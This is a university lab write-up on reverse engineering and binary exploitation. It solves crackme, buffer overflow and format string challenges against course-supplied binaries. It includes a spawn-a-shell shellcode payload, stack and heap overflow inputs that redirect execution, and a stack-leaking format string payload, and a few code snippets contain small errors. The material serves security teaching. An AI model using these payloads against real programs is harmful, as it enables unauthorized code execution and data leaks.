# LAB 03 - Reverse Engineering

> Laboratory for the class “**Security Verification and Testing**” (01TYASM/01TYAOV) 
> Politecnico di Torino – AY 2022/23
> Prof. **Riccardo Sisto**
> 
> Prepared by: **Cataldo Basile** (cataldo.basile@polito.it)

1. [Introduction](#introduction)
2. [`crackme` challenges](#crackme-challenges)
    1. [`crackme1`](#crackme1)
    2. [`crackme2`](#crackme2)
    3. [`crackme3`](#crackme3)
3. [Buffer Overflows](#buffer-overflows)
    1. [`crackme1` with shell](#crackme1-with-shell)
    2. [`bof3`](#bof3-challenge)
    2. [`bof4`](#bof4-challenge)
    2. [`bof5`](#bof5-challenge)
4. [Format strings: a dangerous type of injection](#format-strings-a-dangerous-type-of-injection)
    1. [Reading the memory](#reading-the-memory)
    2. [`fs1` challenge](#fs1-challenge)
    3. [`fs2` challenge](#fs2-challenge)

## Introduction
The purpose of this laboratory is to get familiar with **reverse engineering tools**, which include a **static analyzer** (that is, a disassembler and a decompiler) and **dynamic analysis tool** (that is, a debugger and also some tracers, if you prefer).

The laboratory is divided in four sections: 
- `crackme` challenges require to perform some static and dynamic analysis with tools like **Ghidra** and **gdb**.
- Buffer overflows require to exploit stack and heap overflows in order to influence the flow of the execution.
- Format strings
- ROP chains

## `crackme` Challenges
This section includes three exercises that will require you to perform static and dynamic analysis in order to understand the behavior of a target program and tamper with it.

### `crackme1`
|Tag|Definition|
|:--:|:--:|
|**Purpose**|The purpose is to force the program to print the string ”*This is the answer*” by patching the binary|
|**Suggested tool**|Ghidra|
|**Hints**|Look for comparisons and bypass the correct one|

Firstly, by running the executable we can see that the program asks us to insert a string, giving a warning:
```bash
warning: this program uses gets(), which is unsafe.
Please insert a string:
```

By disassembling the binary with **Ghidra**, we can see the following function is executed after printing the previous messsage: 
<center>
<img src="./Images/crackme1.png" alt="crackme1" width="300"/>
</center>

We can now either patch the binary or overflow the `local_90` variable in order to write our desired value in `local_10`.
- Patching the binary requires simply to set the **conditional jump** `JNZ` in the assembled code to a `NOP` operation. The `JNZ` checks whether two values are the same or not, and in case they are different, it will move the execution to the `else` branch of the code. By patching this instruction, the code execution will continue without jumping and it will print the required string.
- [*More detail in a following exercise*] To overflow the `local_90` variable we can pass 128 bytes to the `gets()` function, which will not check for the length of our input. In this way, we can reach the `local_10` variable, which is stored in the stack just after the `local_90` variable. We can overwrite this with the required value (`0x2a`, which is a `*` in ascii). The solution can be written as:     
```bash
python -c "print('A'*128 + '*')" | ./crackme1
```


### `crackme2`
|Tag|Definition|
|:--:|:--:|
|**Purpose**|Find the password of the user and bypass the authentication procedure|
|**Suggested tool**|Ghidra, gdb|
|**Hints**|Execute the program and try to guess its behaviour. Make a men- tal representation of the program. Disassemble and find what to bypass (using your guesses on the program structure)|

Again, running the program will print a banner and an input to insert the password.
```bash
############################################################
##        Bienvennue dans ce challenge de cracking        ##
############################################################

Veuillez entrer le mot de passe :
```

By disassembling the code with **Ghidra**, it is pretty straightforward which is the password:
<center>
<img src="./Images/crackme2.png" alt="crackme2"/>
</center>


### `crackme3`
|Tag|Definition|
|:--:|:--:|
|**Purpose**|Find the key (it is an integer value)|
|**Suggested tool**|Ghidra, gdb|
|**Hints**|Execute the program and try to guess its behavior. Disassemble and find where the key comparison is performed then discover the value|

Again, **Ghidra**!
<center>
<img src="./Images/crackme3.png" alt="crackme3" width="300"/>
</center>

So password is whichever multiple of `0x4c7`, or also `1223`.

## Buffer Overflows
Now let's dive into buffer overflows.

### `crackme1` with shell
We have seen that the stack is composed of `128` bytes for the `local_90` variable. By exploiting the `gets()` function, we can place the code to spawn a shell in the stack and then overwrite the **return address** in order to get the actual shell.

The payload of the shell is the following (which can easily be generated with `pwntools`): 
```python
from pwn import *

context.update(arch = 'i386', os = 'linux')
shellcode = shellcraft.sh()
payload = asm(schellcode) 
print(payload)
```
Which gives the following **44 bytes** payload:
```python
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

### `bof3` challenge
|Tag|Definition|
|:--:|:--:|
|**Purpose**|Bypass the condition and get the string “You won!”.|
|**Suggested tool**|pwntools, shell + python, gdb.|
|**Hints**|Pay attention to the endianness. Consider using `echo -ne` to bypass shell input manipulation|

Again, let's run **Ghidra** and disassemble the `bof3` binary. 

<center>
<img src="./Images/bof3.png" alt="bof3" width="300"/>
</center>


We can see that we can perform a buffer overflow to overwrite the `local_c` variable. This variable is stored after 10 bytes from `local_16` in the stack, which receives the input with a vulnerable `gets()`. It should be equal to `-0x35013502` which is `0xcafecafe` in hexadecimal. Taking into account the endianness of the machine, we can use 
```python
bytes.fromhex('0xcafecafe'[2:])[::-1]
```

### `bof4` challenge
|Tag|Definition|
|:--:|:--:|
|**Purpose**|Bypass the condition.|
|**Suggested tool**|gdb, then pwntools, shell + python.|
|**Hints**|Find the address of the function by dynamically executing the program.|

Again, let's run **Ghidra** and disassemble the `bof4` binary. 
<center>
<img src="./Images/bof4_main.png" alt="bof4" width="300"/>
</center>

We can see that we can perform a buffer overflow to overwrite the `*local_10` variable. This variable is stored after 10 bytes from `local_1a` in the stack, which receives the input with a vulnerable `gets()`. 

We would like the program to jump to the `win()` function, whose address can be retrieved either with GDB or with Ghidra itself. Therefore, the value of `local_10` should be equal to the address of the `win` function which is `0x00401142` in hexadecimal. 
<center>
<img src="./Images/bof4_win.png" alt="bof4_win"/>
</center>

Taking into account the endianness of the machine, we can use 
```python
p.sendline(b'A'*10 + bytes.fromhex('00401142')[::-1])
```

### `bof5` challenge
|Tag|Definition|
|:--:|:--:|
|**Purpose**|Reverse the binaries then exploit the buffer overflow to bypass the contraint. Do not patch the binaries.|
|**Suggested tool**|Ghidra, then pwntools, shell + python.|
|**Hints**|Find the important function, then disassemble or decompile the program. Plan the payload to inject to successfully mount the exploit.|

One more time: **Ghidra**:
<center>
<img src="./Images/bof5.png" alt="bof5" width="300"/>
</center>

In this case, we need to overflow the heap.
```python
p.sendline(b'A'*30 + b'\x00\x0a' + b'\x01\x00\x00\x00')
```

## Format strings: a dangerous type of injection
The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.

Consider the `printf()` function. The *normal* use of this function is the following:
```C
int a = 5;
char b = 'z';
char *c = "Hello";

printf("%d %c %s", a, b, c);
```
where each variable is stored in the stack, retrieved and converted to the specified type before printing.

> [Here](https://man7.org/linux/man-pages/man3/printf.3.html)'s the reference for the `printf()` function.


The `printf` function writes output to the output stream, under control of the string pointed to by format that specifies how subsequent arguments are converted for output. **If there are insufficient arguments for the format, the behavior is undefined**. **If the format is exhausted while arguments remain, the excess arguments are evaluated (as always) but are otherwise ignored**. The `printf` function returns when the end of the format string is encountered.

Therefore, the `printf()` function is allowed to have more formats or more arguments, however:
- if more arguments are passed to the `printf()`, the execution is safe and those arguments are simply ignored.
- if less arguments are passed to the `printf()`, there can be potential security risk to be considered. It is indeed possible to **leak the stack**, as an example.

Suppose to have the following `c` file:
```C
#include <stdio.h>

int main(void) {
	char buffer[128];

	printf("Insert a string: ");
	gets(buffer, sizeof(buffer), stdin);
	printf(buffer);

	return 0;
}
```

This code is vulnerable due to the `printf(buffer)` call, that allows an attacker to insert arbitrary formatting in the code.

Moreover, the `printf` allows us to directly access the passed arguments: 
```C
printf("%2$d %3$d %1$d", a, b, c);
```

In this case `%2$d` refers to the second variable passed to the `printf` (i.e., `b`), `%3$d` to the third and `%1$d` to the first, allowing **direct access to the variables**.

Finally, the printf can also save data in memory, as in the following instruction:
```C
printf("The printf can store the number of bytes written to stdout up to this point %n (this number is stored in n1) and the ones up to this point %n (this number is stored in n2)\n", &n1, &n2);
```

### Reading the memory
Suppose to have the following `c` file:
```C
#include <stdio.h>

int main(void) {
	char buffer[128];

	printf("Insert a string: ");
	gets(buffer, sizeof(buffer), stdin);
	printf(buffer);

	return 0;
}
```

We can pass arbitrary formats to the `printf(buffer)` and leak the whole stack. We can also add a **marker** to indicate we have reached the end of the stack.
```python
p.sendline(b'AAAA' + b'%x'*62)
```
whose (one of the possible) output is the following:
```bash
AAAA111a64aa025414141257825784141414178257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782510003fab820011874d900118918056601805678038b0efe6180567811893db018400409252efe6a23aefe6000003fab820001874e4018056883db018412e00010a018056700010c518056681c1180581b0180583f1805850
```

### `fs1` challenge
|Tag|Definition|
|:--:|:--:|
|**Purpose**|Apply a format string attack to read the content of a local variable.|
|**Suggested tool**|`pwntools`, shell + python.|
|**Hints**|Find the address of the memory location to read then use the examples seen before to read the content (the marker example). Observe the stack, compare its address with the address of the PIN, then reason about where the buffer is to make a simpler attack.|


### `fs2` challenge
|Tag|Definition|
|:--:|:--:|
|**Purpose**|Apply a format string attack to read the content of a global variable.|
|**Suggested tool**|`pwntools`, shell + python.|
|**Hints**|Find the address of the memory location to read then use the examples seen before to read the content (the marker example).|

